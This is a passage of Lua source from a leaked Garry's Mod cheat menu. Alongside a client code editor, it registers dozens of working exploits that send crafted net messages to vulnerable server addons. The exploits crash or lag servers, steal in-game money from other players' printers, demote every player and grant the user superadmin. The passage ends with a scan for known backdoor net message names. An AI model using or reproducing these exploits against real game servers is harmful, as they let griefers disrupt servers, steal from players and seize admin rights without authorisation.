		clos:SetSize(40,23)
		clos:SetText("")
		clos.Paint = function(self,w,h)
			surface.SetDrawColor(196,80,80)
			surface.DrawRect(0,0,w,h)
			surface.SetFont("marlett")
			local s,s1 = surface.GetTextSize("r")
			surface.SetTextPos(w/2-s/2,h/2-s1/2)
			surface.SetTextColor(255,255,255)
			surface.DrawText("r")
		end
		clos.DoClick = function()
			menu:SetVisible(!menu:IsVisible())
		end
	
		local ed = vgui.Create('lua_editor', menu)
		ed:SetPos(5, 55)
	
		menu.PerformLayout = function(self, w, h)
			clos:SetPos(w-41, 1)
			ed:SetSize(w-10, h-60)
		end
	
		local offset = 5
	
		local function CreateBtn(wide, text, icon, fn)
			local mt = Material(icon)
			local btn = vgui.Create('DButton', menu)
			btn:SetText('')
			btn.Paint = function(self,w,h)
				if self.Hovered then
					if self.Depressed then
						surface.SetDrawColor(90,90,90)
					else
						surface.SetDrawColor(70,70,70)
					end
				else
					surface.SetDrawColor(40,40,40)
				end
			
				surface.DrawRect(0,0,w,h)
				surface.SetDrawColor(255,255,255)
				surface.SetMaterial(mt)
				surface.DrawTexturedRect(5,h / 2 - 8,16,16)
				draw.SimpleText(text,'BudgetLabel',26,h / 2,Color(255,255,255),0,1)
			end
			btn.DoClick = fn
			btn:SetSize(wide, 20)
			btn:SetPos(offset, 30)
			offset=offset + wide + 5
		end
	
		-- CreateBtn(130, "Run on server", 'icon16/application_osx_terminal.png', function()
		-- 	local code = ed:GetCode()
		-- 	net.Start('_da_')
		-- 	net.WriteString(code)
		-- 	net.WriteUInt(1, 2)
		-- 	net.SendToServer()
		-- end)
		CreateBtn(115, "Run on self", 'icon16/arrow_down.png', function()
			local code = ed:GetCode()
			RunString(code)
		end)
		-- CreateBtn(130, "Run on clients", 'icon16/group.png', function()
		-- 	local code = ed:GetCode()
		-- 	net.Start('_da_')
		-- 	net.WriteString(code)
		-- 	net.WriteUInt(2, 2)
		-- 	net.SendToServer()
		-- end)
		-- CreateBtn(125, "Run on player", 'icon16/user.png', function() 
		-- 	local code = ed:GetCode()
		-- 	local m = DermaMenu()
		-- 	for k, v in pairs(player.GetAll()) do
		-- 		m:AddOption(v:Name(), function()
		-- 			net.Start('_da_')
		-- 			net.WriteString(code)
		-- 			net.WriteUInt(3, 2)
		-- 			net.WriteEntity(v)
		-- 			net.SendToServer()
		-- 		end)
		-- 	end
		-- 	m:Open()
		-- end)
	
		-- CreateBtn(115, "Get player", 'icon16/pencil.png', function() 
		-- 	local m = DermaMenu()
		-- 	for k, v in pairs(player.GetAll()) do
		-- 		m:AddOption(v:Name(), function()
		-- 			SetClipboardText('Entity('..v:EntIndex()..')')
		-- 		end)
		-- 	end
		-- 	m:Open()
		-- end)
	
		concommand.Add('editor', function() menu:SetVisible(!menu:IsVisible()) end)
		
		iZNX.Menu:Remove()
		
		MsgC(Color(255, 155, 55), "Loading end!\n")
		end
	------------------------------------------------------------------------------------------------------------------------------------------------------------
	function gui.url()
	surface.PlaySound("garrysmod/ui_click.wav")
	gui.OpenURL( "discord.gg/BszpW92" )
	end
	function iZNX.ChatText( str )
	ctext( Color(190, 190, 190), [[ [LEAK BY DEMBI]: ]]..str )
	end
	function iZNX.NetStart( str )
	local netstart = net.Start
	if Defqon and Defqon.G and Defqon.G.net then
	netstart = Defqon.G.net.Start
	else
	--        print( "sending netmessage in insecure mode" )
	end
	return netstart( str )
	end
	function iZNX.ValidNetString( str )
	local netstart = net.Start
	if Defqon and Defqon.G and Defqon.G.net then
	netstart = Defqon.G.net.Start
	else
	--        print( "scanning for exploit in insecure mode" )
	end
	local status, error = pcall( netstart, str )
	return status
	end
	function iZNX.ValidNetString( str )
	local status, error = pcall( net.Start, str )
	return status
	end
	iZNX.sploits = {}
	local severitycols = { -- Цвет обводки эксплойтов (их "значимость")
	[1337] = Color( 255, 0, 0 ),
	[1] = Color( 33, 33, 33 ),
	[2] = Color( 33, 33, 33 ),
	[3] = Color( 33, 33, 33 ),
	[4] = Color( 33, 33, 33 ),
	}
	function iZNX.AddExploit( name, tab ) -- ОДЭДЭ ЭКСПЛОЙТ, FUCK
	if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
	if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
	iZNX.sploits[name] = tab
	end
	function iZNX.IsStored( addr )
	return iZNX.memory[addr] != nil
	end
	function iZNX.GetStored( addr, fallback )
	if fallback and iZNX.memory[addr] == nil then return fallback end
	return iZNX.memory[addr]
	end
	function iZNX.Store( addr, val )
	iZNX.memory[addr] = val
	end
	function iZNX.GetAllStored()
	return iZNX.memory
	end
	function iZNX.GetAllStoredData()
	local ret = {}
	for k, v in pairs( iZNX.memory ) do
	if !istable( v ) then ret[k] = v end
	end
	return ret
	end
	spoofchat = 0
	-----------------------------------------------------------------------------  EXPLOITS  -------------------------------------------------------------------------------------------------------------------------------------------
	
	--[[ ------------------------------------------------------------------------------------------------------------------------------------
	!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   NEW SHIT   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	-----------------------------------------------------------------------------------------------------------------------------------------]]
	
	iZNX.AddExploit( "[NEW] Crasher", {
	desc = "Exploit",
	severity = 1337,
	scan = function() return iZNX.ValidNetString( "pac.net.TouchFlexes.ClientNotify" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "crashlol" ) then
	timer.Create("crashlol", 0, 0, function()
	for i = 1, 400 do
	iZNX.NetStart("pac.net.TouchFlexes.ClientNotify")
	net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999999, 13)
	net.SendToServer()
	end
	end)
	iZNX.ChatText("Начинаем краш")
	else
	timer.Remove("crashlol")
	iZNX.ChatText("Прекращаем краш")
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "[NEW] € Easy Money €", {
	desc = "Exploit на деньги",
	severity = 1337,
	scan = function() return iZNX.ValidNetString( "ply_pick_shit" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Получаем деньги")
	for k, v in pairs (player.GetAll()) do
	for i = 1,255 do
	iZNX.NetStart("ply_pick_shit")
	net.WriteEntity(LocalPlayer())
	net.WriteEntity(v)
	net.SendToServer()
	end
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "[NEW] Spoof Chat Icon", {
	desc = "Не серьезный эксплойт, просто фановый. Убирает иконку набирания текста",
	severity = 1337,
	scan = function() return iZNX.ValidNetString( "TalkIconChat" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if spoofchat == 0 then
	hook.Remove('StartChat', 'TalkIcon')
	iZNX.NetStart("TalkIconChat")
	net.WriteBool(true)
	net.SendToServer()
	spoofchat = 1
	iZNX.ChatText("Icon Spoofer включен")
	else
	iZNX.NetStart("TalkIconChat")
	net.WriteBool(false)
	net.SendToServer()
	iZNX.ChatText("Icon Spoofer выключен")
	spoofchat = 0
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "[NEW] TFA Lag Exploit", {
	desc = "Exploit для создания лагов на сервере, с паком оружия TFA",
	severity = 1337,
	scan = function() return iZNX.ValidNetString( "TFA_Attachment_RequestAll" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Начинаем лаги")
	if !timer.Exists( "tfalags" ) then
	timer.Create("tfalags", 0, 0, function()
	for i = 1, 400 do
	iZNX.NetStart("TFA_Attachment_RequestAll")
	net.SendToServer()
	end
	end )
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "Lag Exploit #1", {
	desc = "Exploit на лаги",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "NDES_SelectedEmblem" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Начинаем лаги")
	if not timer.Exists("lagger10") then
	timer.Create("lagger10", 0.5, 0, function()
	for i = 1, 2000 do
	iZNX.NetStart("NDES_SelectedEmblem")
	net.WriteString("Seized")
	net.SendToServer()
	end
	end)
	else
	timer.Remove("lagger10")
	iZNX.ChatText("Прекращаем лаги")
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Crasher #1", {
	desc = "Exploit на краш сервера",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "Morpheus.StaffTracker" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Крашим")
	if not timer.Exists("crasher") then
	timer.Create("crasher", 0.5, 0, function()
	for i = 1, 2000 do
	iZNX.NetStart("Morpheus.StaffTracker")
	net.SendToServer()
	end
	end)
	else
	timer.Remove("crasher")
	iZNX.ChatText("Останавливаем краш")
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Lag Exploit#2", {
	desc = "Exploit на лаги",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "join_disconnect" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Начинаем лаги")
	if not timer.Exists("lagglol") then
	timer.Create("lagglol", 0.5, 0, function()
	for i = 1, 3000 do
	iZNX.NetStart("join_disconnect")
	net.WriteEntity(table.Random(player.GetAll()))
	net.SendToServer()
	end
	end)
	else
	timer.Remove("lagglol")
	iZNX.ChatText("Прекращаем лаги")
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Lag Exploit #3", {
	desc = "Exploit на лаги",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "EZS_PlayerTag" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Начинаем лаги")
	if not timer.Exists("laggslol") then
	timer.Create("laggslol", 0.5, 0, function()
	for k, v in pairs(player.GetAll()) do
	iZNX.NetStart("EZS_PlayerTag")
	net.WriteEntity(v)
	net.WriteString("Seized")
	net.SendToServer()
	timer.Simple(2, function()
	iZNX.NetStart("EZS_PlayerTag")
	net.WriteEntity(v)
	net.WriteString("Seized")
	net.SendToServer()
	end )
	end
	end )
	else
	timer.Remove("laggslol")
	iZNX.ChatText("Прекращаем лаги")
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "Remove Spread", {
	desc = "Exploit убирает разброс",
	severity = 1,
	scan = function() return checkcvar end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	hook.Remove("PlayerTick", "WyoziAdvTTTSpreadOverTime")
	iZNX.ChatText("� азброс убран")
	end }
	}
	}
	)
	iZNX.AddExploit( "Give physgun", {
	desc = "Получение физгана",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "BuyFirstTovar" ) end,
	functions = {
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("BuyFirstTovar")
	net.WriteString("0")
	net.SendToServer()
	iZNX.ChatText("Получен physgun")
	end }
	}
	}
	)
	iZNX.AddExploit( "Give gravity gun", {
	desc = "Получение гравити гана",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "BuySecondTovar" ) end,
	functions = {
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("BuySecondTovar")
	net.WriteString("0")
	net.SendToServer()
	iZNX.ChatText("Получен gravity gun")
	end }
	}
	}
	)
	iZNX.AddExploit( "Auto-Heal", {
	desc = "Exploit на автоматическое лечение",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "GiveHealthNPC" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if not autoheal_enable then
	iZNX.ChatText("AutoHeal - вкл")
	hook.Add("Think", "RE.CheckHealt", function()
	if LocalPlayer():Health() < 100 then
	iZNX.NetStart("GiveHealthNPC")
	net.WriteString("100")
	net.SendToServer()
	end
	end)
	autoheal_enable = true
	else
	iZNX.ChatText("AutoHeal - выкл")
	hook.Remove("Think", "RE.CheckHealt")
	autoheal_enable = false
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "Unbox System Manipulation Exploit #1", {
	desc = "Exploit с ключами и кейсами из CSGO",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "BuyKey" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Получаем ключ")
	iZNX.NetStart("BuyKey")
	net.SendToServer()
	end }
	}
	}
	)
	iZNX.AddExploit( "Unbox System Manipulation Exploit #2", {
	desc = "Exploit с ключами и кейсами из CSGO",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "BuyCrate" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Получаем кейс")
	iZNX.NetStart("BuyCrate")
	net.SendToServer()
	end }
	}
	}
	)
	iZNX.AddExploit( "Get Weapon", {
	desc = "Exploit на получение оружия",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "MONEY_SYSTEM_GetWeapons" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Получаем оружие")
	for i = 1,32 do
	iZNX.NetStart("MONEY_SYSTEM_GetWeapons")
	net.WriteInt(i, 8)
	net.SendToServer()
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "Demote Exploit", {
	desc = "Exploit на увольнение всех людей на сервере",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "MCon_Demote_ToServer" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Увольняем")
	for k,v in pairs(player.GetAll()) do
	iZNX.NetStart("MCon_Demote_ToServer")
	net.WriteString(v:SteamID())
	net.SendToServer()
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "€ Printers Money Stealer # €", {
	desc = "Exploit на воровство денег с чужих принтеров",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "SyncPrinterButtons16690" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_money" ) then
	iZNX.ChatText( "Воруем чужие деньги" )
	timer.Create( "Defqon_exploit_money", 0.1, 0, function()
	for k, v in pairs(ents.GetAll()) do
	if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
	iZNX.NetStart( "SyncPrinterButtons16690" )
	net.WriteEntity(v)
	net.WriteUInt(2, 4)
	net.SendToServer()
	end
	end
	end)
	else
	timer.Remove( "Defqon_exploit_money" )
	iZNX.ChatText( "Прекращаем воровать" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ Derma Printers Money Stealer €", {
	desc = "Exploit на воровство денег с чужих принтеров",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "withdrawp" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Воруем - "..#ents.FindByClass("derma_printer").." шт.")
	for k,v in pairs(ents.FindByClass("derma_printer")) do
	net.Start("withdrawp")
	net.WriteEntity(v)
	net.SendToServer()
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "€ Money Exploit €", {
	desc = "DarkRP_SS_Gamble",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "DarkRP_SS_Gamble" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart( "DarkRP_SS_Gamble" )
	net.WriteInt(50000, 32)
	net.WriteInt(1, 32)
	net.WriteInt(0, 32)
	net.WriteInt(0, 32)
	net.WriteInt(1, 32)
	net.SendToServer()
	end }
	}
	})
	iZNX.AddExploit( "TestPromoCode", {
	desc = "что-то связаное с компами, хз",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "PCAdd" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart( "PCAdd" )
	net.WriteString("alahman")
	net.WriteString("300000000")
	net.SendToServer()
	timer.Simple(3,function()
	iZNX.NetStart("ActivatePC")
	net.WriteString("alahman")
	net.SendToServer()
	iZNX.NetStart("PCDelAll")
	net.SendToServer()
	end
	)
	end}
	}
	}
	)
	--[[ TO FIX!!! -------------------------------------------------------------------
	iZNX.AddExploit( "Disguise/Маскировка #2", {
	desc = "DarkRP_SS_Gamble",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "DarkRP_SS_Gamble" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText( "Тадам" )
	end }
	}
	})
	----------------------------------------------------------------------------------]]
	iZNX.AddExploit( "Ulx Console Flood", {
	desc = "Обычный ulx flood в консоль",
	severity = 1,
	scan = function() return ulx end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if ulxflood then
	hook.Remove("Think", "FloodULX")
	ulxflood = false
	else
	hook.Add("Think", "FloodULX", function()
	LocalPlayer():ConCommand("_u Seized")
	end)
	ulxflood = true
	end
	iZNX.ChatText("UlxFlood - "..tostring(ulxflood))
	end }
	}
	}
	)
	iZNX.AddExploit( "HL2RP Disp", {
	desc = "Запускает одну голосовую команду, по типу коменданского часа (как в hl2)",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "viv_hl2rp_disp_message" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText( "Запускаем" )
	for name, command in pairs (dispatchCommands) do
	iZNX.NetStart("viv_hl2rp_disp_message")
	net.WriteString(command)
	net.SendToServer()
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "HL2RP Disp Flood", {
	desc = "Запускает много голосовых команд, по типу коменданского часа (как в hl2)",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "viv_hl2rp_disp_message" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText( "Flood - on" )
	if not timer.Exists("HL2RPFLOOD") then
	timer.Create("HL2RPFLOOD", 0, 0, function()
	for name, command in pairs (dispatchCommands) do
	iZNX.NetStart("viv_hl2rp_disp_message")
	net.WriteString(command)
	net.SendToServer()
	end
	end
	)
	else
	timer.Remove("HL2RPFLOOD")
	iZNX.ChatText( "Flood - off" )
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "Easter Egg", {
	desc = "Находит пасхальные яйца",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "egg" ) end,
	functions = {
	{ typ = "func", name = "1 яйцо", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	RunConsoleCommand("say", "4bigz")      
	end, },
	{ typ = "func", name = "2 яйцо", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	RunConsoleCommand("cc_egg2")      
	end, },
	{ typ = "func", name = "3 яйцо", func = function()
	iZNX.NetStart("egg")              
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Атака нулевого дня #1", {
	desc = "Вызывает моментальный сбой в работе системы и сервер крашится к чертям",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "Sbox_gm_attackofnullday" ) end,
	functions = {
	{ typ = "func", name = "Начать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	RunConsoleCommand("gm_attackofnullday")
	end, },
	},
	} )
	iZNX.AddExploit( "Атака нулевого дня #2", {
	desc = "Выдает вам суперадминку",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "Sbox_gm_attackofnullday_key" ) end,
	functions = {
	{ typ = "func", name = "Начать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText( "Выдаем админку" )
	iZNX.NetStart("Sbox_gm_attackofnullday_key")
	net.WriteString( "ulx adduser \""..lp:Nick().."\" superadmin" )
	net.WriteBit(0)
	net.SendToServer()
	RunConsoleCommand("gm_attackofnullday")
	end, },
	},
	} )
	iZNX.AddExploit( "Toggle TTT Report Bypass", {
	desc = "TTT Report Bypass",
	severity = 1,
	scan = function() return isttt end,
	functions = {
	{ typ = "func", name = "Начать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if bypass == 0 then
					hook.Add("Think", "remove_ttt_report", function()
						local pan = vgui.GetHoveredPanel()
						CheckChild(pan)
					end)
	
					iZNX.ChatText("Report Bypass включен")
					bypass = 1
				else
					hook.Remove("Think", "remove_ttt_report")
					iZNX.ChatText("Report Bypass выключен")
					bypass = 0
	end
	end }
	}
	}
	)
	
	--[[ ------------------------------------------------------------------------------------------------------------------------------------
	!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   OLD SHIT   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	-----------------------------------------------------------------------------------------------------------------------------------------]]
	iZNX.AddExploit( "€ Customizable Printers Money Stealer €", {
	desc = "Мгновенно крадет все деньги от каждого принтера на сервере",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
	functions = {
	{ typ = "func", name = "Тык", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_shekels" ) then
	iZNX.ChatText( "Воруем чужие деньги" )
	timer.Create( "Defqon_exploit_shekels", 0.1, 0, function()
	for k, v in pairs(ents.GetAll()) do
	if( v:GetClass():find("print") ) then
	iZNX.NetStart( "SyncPrinterButtons76561198056171650" )
	net.WriteEntity(v)
	net.WriteUInt(2, 4)
	net.SendToServer()
	end
	end
	end)
	else
	timer.Remove( "Defqon_exploit_shekels" )
	iZNX.ChatText( "Прекращаем воровать" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "ULX Friends Spam", {
	desc = "Спам сообщением на сервере",
	severity = 1,
	scan = function() return (iZNX.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
	functions = {
	{ typ = "string", name = "Введите сообщение", default = "FUCK YOU", addr = "fr_spamstring" },
	{ typ = "players", addr = "fr_players" },
	{ typ = "func", name = "Big Spam", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "bigspams" ) then
	iZNX.ChatText( "Начинаем спам" )
	timer.Create( "bigspams", 0.5, 0, function()
	local t = iZNX.GetStored( "fr_players", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	local buyit = {}
	for i = 1, 15 do
	table.insert( buyit, iZNX.GetStored( "fr_spamstring", "FUCK YOU" ) )
	end
	iZNX.NetStart( "sendtable" )
	net.WriteEntity( v )
	net.WriteTable( buyit )
	net.SendToServer()
	end
	end)
	else
	timer.Remove( "bigspams" )
	iZNX.ChatText( "Прекращаем спам" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Console Error Spammer", {
	desc = "(Поражение rcon сервера массовыми ошибками)",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "steamid2" ) end,
	functions = {
	{ typ = "func", name = "Big Spam", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_errorz" ) then
	iZNX.ChatText( "Error спам запущен" )
	timer.Create( "Defqon_exploit_errorz", 0.1, 0, function()
	iZNX.NetStart( "steamid2" )
	net.WriteString( "Something is creating very strong script errors" )
	net.SendToServer()
	end)
	else
	timer.Remove( "Defqon_exploit_errorz" )
	iZNX.ChatText( "Error спам остановлен" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Turbo Error Spammer", {
	desc = "Поражение rcon сервера массовыми ошибками",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "steamid2" ) end,
	functions = {
	{ typ = "func", name = "Big Spam", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_errorzt" ) then
	iZNX.ChatText( "Error спам запущен" )
	timer.Create( "Defqon_exploit_errorzt", 0, 0, function()
	for i = 1, 100 do
	iZNX.NetStart( "steamid2" )
	net.WriteString( "Something is creating very strong script errors" )
	net.SendToServer()
	end
	end)
	else
	timer.Remove( "Defqon_exploit_errorzt" )
	iZNX.ChatText( "Error спам остановлен" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ Kun Drug €", {
	desc = "Exploit на деньги",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "Kun_SellDrug" ) end,
	functions = {
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_selldrugon" ) then
	iZNX.ChatText( "Exploit запущен" )
	timer.Create( "Defqon_exploit_selldrugon", 0, 0, function()
	for i=1,1000 do
	iZNX.NetStart("Kun_SellDrug")
	net.WriteString("mushroom")
	net.SendToServer()
	end 
	end)
	else
	timer.Remove( "Defqon_exploit_selldrugon" )
	iZNX.ChatText( "Exploit остановлен" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Point Shop Unbox", {
	desc = "Exploit, связанный с аддоном Point Shop",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "net_PSUnBoxServer" ) end,
	functions = {
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(player.GetAll()) do
	local i = 0
	for k2,v2 in pairs(PS.Items) do 
	if !v:PS_HasItem(v2.ID) then  
	timer.Simple(k*i*1.7,function() 
	iZNX.NetStart("net_PSUnBoxServer") 
	net.WriteEntity(v) 
	net.WriteString(v2.ID) 
	net.SendToServer() 
	end) 
	i = i + 1
	end 
	end
	end
	end, },
	},
	} )
	iZNX.AddExploit( "☢ PatchPlay Give Superadmin ☢", {
	desc = "Выдача супер админки (нужен перезаход на сервер!)",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "pplay_deleterow" ) end,
	functions = {
	{ typ = "players", addr = "l_superadmins" },
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_superadmins", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	local id = v:SteamID()
	local tbl = {}
	tbl.name = "FAdmin_PlayerGroup"
	tbl.where = {
	"steamid",
	tostring(id)
	}
	iZNX.NetStart("pplay_deleterow")
	net.WriteTable(tbl)
	net.SendToServer()
	local tbl = {}
	tbl.tblname = "FAdmin_PlayerGroup"
	tbl.tblinfo = {
	tostring(id),
	"superadmin"
	}
	iZNX.NetStart("pplay_addrow")
	net.WriteTable(tbl)
	net.SendToServer()
	iZNX.ChatText( "Выдана супер админка "..v:Nick() )
	end
	end, },
	},
	} )
	local thefrenchenculer = ""
	if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
	thefrenchenculer = "Sandbox_ArmDupe"
	else
	if iZNX.ValidNetString( "Sbox_darkrp" ) then
	thefrenchenculer = "Sbox_darkrp"
	else
	if iZNX.ValidNetString( "Sbox_itemstore" ) then
	thefrenchenculer = "Sbox_itemstore"
	else
	if iZNX.ValidNetString( "Ulib_Message" ) then
	thefrenchenculer = "Ulib_Message"
	else
	if iZNX.ValidNetString( "ULogs_Info" ) then
	thefrenchenculer = "ULogs_Info"
	else
	if iZNX.ValidNetString( "ITEM" ) then
	thefrenchenculer = "ITEM"
	else
	if iZNX.ValidNetString( "fix" ) then
	thefrenchenculer = "fix"
	else
	if iZNX.ValidNetString( "Fix_Keypads" ) then
	thefrenchenculer = "Fix_Keypads"
	else
	if iZNX.ValidNetString( "Remove_Exploiters" ) then
	thefrenchenculer = "Remove_Exploiters"
	else
	if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
	thefrenchenculer = "noclipcloakaesp_chat_text"
	else
	if iZNX.ValidNetString( "_Defqon" ) then
	thefrenchenculer = "_Defqon"
	else
	if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
	thefrenchenculer = "_CAC_ReadMemory"
	else
	if iZNX.ValidNetString( "nostrip" ) then
	thefrenchenculer = "nostrip"
	else
	if iZNX.ValidNetString( "nocheat" ) then
	thefrenchenculer = "nocheat"
	else
	if iZNX.ValidNetString( "LickMeOut" ) then
	thefrenchenculer = "LickMeOut"
	else
	if iZNX.ValidNetString( "ULX_QUERY2" ) then
	thefrenchenculer = "ULX_QUERY2"
	else
	if iZNX.ValidNetString( "ULXQUERY2" ) then
	thefrenchenculer = "ULXQUERY2"
	else
	if iZNX.ValidNetString( "MoonMan" ) then
	thefrenchenculer = "MoonMan"
	else
	if iZNX.ValidNetString( "Im_SOCool" ) then
	thefrenchenculer = "Im_SOCool"
	else
	if iZNX.ValidNetString( "Sandbox_GayParty" ) then
	thefrenchenculer = "Sandbox_GayParty"
	else
	if iZNX.ValidNetString( "DarkRP_UTF8" ) then
	thefrenchenculer = "DarkRP_UTF8"
	else
	if iZNX.ValidNetString( "oldNetReadData" ) then
	thefrenchenculer = "oldNetReadData"
	else
	if iZNX.ValidNetString( "memeDoor" ) then
	thefrenchenculer = "memeDoor"
	else
	if iZNX.ValidNetString( "BackDoor" ) then
	thefrenchenculer = "BackDoor"
	else
	if iZNX.ValidNetString( "OdiumBackDoor" ) then
	thefrenchenculer = "OdiumBackDoor"
	else
	if iZNX.ValidNetString( "SessionBackdoor" ) then
	thefrenchenculer = "SessionBackdoor"
	else
